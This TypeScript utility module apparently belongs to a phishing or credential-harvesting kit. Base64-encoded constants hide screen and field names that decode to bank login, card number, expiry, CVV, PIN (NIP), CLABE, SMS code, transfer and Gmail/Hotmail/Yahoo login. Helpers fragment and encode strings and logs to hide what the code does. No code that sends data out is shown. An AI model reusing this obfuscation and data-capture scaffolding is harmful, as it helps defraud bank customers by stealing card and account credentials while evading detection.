// Utilidades de protección y ofuscación
export const protectionUtils = {
  // Encoder/decoder para strings sensibles
  encode: (str: string): string => btoa(str),
  decode: (encodedStr: string): string => atob(encodedStr),
  
  // Función para ofuscar nombres de variables
  obfuscateVarName: (prefix: string, suffix: string): string => {
    const middle = btoa(Math.random().toString()).substring(0, 6);
    return `${prefix}_${middle}_${suffix}`;
  },
  
  // Función para generar IDs únicos ofuscados
  generateObfuscatedId: (): string => {
    return btoa(Date.now().toString() + Math.random().toString()).substring(0, 12);
  },
  
  // Función para fragmentar strings largos
  fragmentString: (str: string, parts: number = 3): string[] => {
    const length = Math.ceil(str.length / parts);
    const fragments = [];
    for (let i = 0; i < parts; i++) {
      fragments.push(str.substring(i * length, (i + 1) * length));
    }
    return fragments;
  },
  
  // Función para reconstruir strings fragmentados
  reconstructString: (fragments: string[]): string => {
    return fragments.join('');
  },
  
  // Función para ofuscar logs
  obfuscateLog: (message: string): string => {
    return btoa(message);
  },
  
  // Función para validar datos sin exponer la validación
  validateData: (data: any, type: string): boolean => {
    const validators = {
      [btoa('email')]: (value: string) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value),
      [btoa('phone')]: (value: string) => /^\d{10}$/.test(value),
      [btoa('code')]: (value: string) => /^\d{6}$/.test(value),
      [btoa('card')]: (value: string) => {
        const cleanValue = value.replace(/\D/g, '');
        if (cleanValue.length < 13 || cleanValue.length > 19) return false;
        let sum = 0;
        let shouldDouble = false;
        for (let i = cleanValue.length - 1; i >= 0; i--) {
          let digit = parseInt(cleanValue.charAt(i));
          if (shouldDouble) {
            digit *= 2;
            if (digit > 9) digit -= 9;
          }
          sum += digit;
          shouldDouble = !shouldDouble;
        }
        return (sum % 10) === 0;
      }
    };
    
    const validator = validators[btoa(type)];
    return validator ? validator(data) : false;
  }
};

// Constantes ofuscadas
export const obfuscatedConstants = {
  SCREEN_TYPES: {
    LOGIN: atob('bG9naW4='),
    CARD: atob('dGFyamV0YQ=='),
    PHONE: atob('dGVsZWZvbm8='),
    CODE: atob('Y29kaWdv'),
    EMAIL: atob('Y29ycmVv'),
    PASSWORD: atob('Y29udHJhc2VuYQ=='),
    SMS: atob('c21z'),
    VALIDATION: atob('dmFsaWRhbmRv'),
    TRANSFER: atob('dHJhbnNmZXJpcg=='),
    CANCEL: atob('Y2FuY2VsYWNpb24='),
    MESSAGE: atob('bWVuc2FqZQ=='),
    PROTECT: atob('cHJvdGVnZXI='),
    NIP: atob('bmlw'),
    FOLIO: atob('Zm9saW8='),
    TERMS: atob('dGVybWlub3M='),
    PROMO: atob('cHJvbW9jaW9u'),
    FLIGHTS: atob('dnVlbG9z'),
    GMAIL: atob('Z21haWw='),
    HOTMAIL: atob('aG90bWFpbA=='),
    YAHOO: atob('eWFob28='),
    VERIFY: atob('dmVyaWZpY2Fy'),
    GENERATING: atob('Z2VuZXJhbmRv'),
    CARD_DATA: atob('ZGF0b3NfdGFyamV0YQ==')
  },
  
  MESSAGES: {
    INVALID_INPUT: atob('RGF0b3MgaW52YWxpZG9z'),
    PROCESSING: atob('UHJvY2VzYW5kbw=='),
    SUCCESS: atob('RXhpdG9zbw=='),
    ERROR: atob('RXJyb3I='),
    VALIDATION_FAILED: atob('VmFsaWRhY2lvbiBmYWxsaWRh'),
    UNAUTHORIZED: atob('Tm8gYXV0b3JpemFkbw=='),
    EXPIRED: atob('RXhwaXJhZG8='),
    INVALID_SESSION: atob('U2VzaW9uIGludmFsaWRh'),
    SECURITY_ALERT: atob('QWxlcnRhIGRlIHNlZ3VyaWRhZA=='),
    ACCOUNT_LOCKED: atob('Q3VlbnRhIGJsb3F1ZWFkYQ==')
  },
  
  FIELD_NAMES: {
    USERNAME: atob('dXNlcm5hbWU='),
    PASSWORD: atob('cGFzc3dvcmQ='),
    EMAIL: atob('ZW1haWw='),
    PHONE: atob('cGhvbmU='),
    CODE: atob('Y29kZQ=='),
    CARD_NUMBER: atob('Y2FyZF9udW1iZXI='),
    EXPIRY_DATE: atob('ZXhwaXJ5X2RhdGU='),
    CVV: atob('Y3Z2'),
    NIP: atob('bmlw'),
    FOLIO: atob('Zm9saW8='),
    AMOUNT: atob('YW1vdW50'),
    CLABE: atob('Y2xhYmU='),
    ACCOUNT_HOLDER: atob('YWNjb3VudF9ob2xkZXI='),
    ALIAS: atob('YWxpYXM='),
    ADDRESS: atob('YWRkcmVzcw=='),
    TERMINATION: atob('dGVybWluYXRpb24='),
    BALANCE: atob('YmFsYW5jZQ=='),
    COMMERCE: atob('Y29tbWVyY2U='),
    MESSAGE: atob('bWVzc2FnZQ==')
  }
};